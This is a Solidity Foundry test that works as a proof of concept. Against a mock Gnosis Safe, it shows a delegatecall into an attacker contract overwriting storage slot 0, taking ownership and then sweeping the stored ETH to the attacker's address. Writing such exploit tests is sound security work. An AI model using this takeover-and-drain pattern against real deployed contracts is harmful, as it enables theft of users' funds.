// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;
import "../lib/forge-std/src/Test.sol";
import "../src/GnosisSafeMock.sol";
import "../src/AttackerContract.sol";

contract ExploitTest is Test {
    GnosisSafeMock safe;
    AttackerContract attacker;

    address originalOwner = address(0xABCD);
    address attackerEOA = address(0xBADBEEF);

    function setUp() public {
        vm.prank(originalOwner);
        safe = new GnosisSafeMock();
        attacker = new AttackerContract();

        // Send ETH to the safe
        vm.deal(address(this), 1 ether);
        payable(address(safe)).transfer(1 ether);
    }

    function testExploit() public {
        // Confirm original owner
        assertEq(safe.owner(), originalOwner);

        // Construct malicious calldata to overwrite slot 0
        bytes memory data = abi.encodeWithSignature(
            "transfer(address,uint256)",
            attackerEOA,
            0
        );

        // Attacker executes delegatecall via execTransaction
        vm.prank(originalOwner);
        safe.execTransaction(address(attacker), data);

        // Owner is now attacker
        assertEq(safe.owner(), attackerEOA);

        // Now attacker can drain funds
        vm.prank(attackerEOA);
        safe.sweepETH(attackerEOA);

        assertEq(attackerEOA.balance, 1 ether);
    }
}
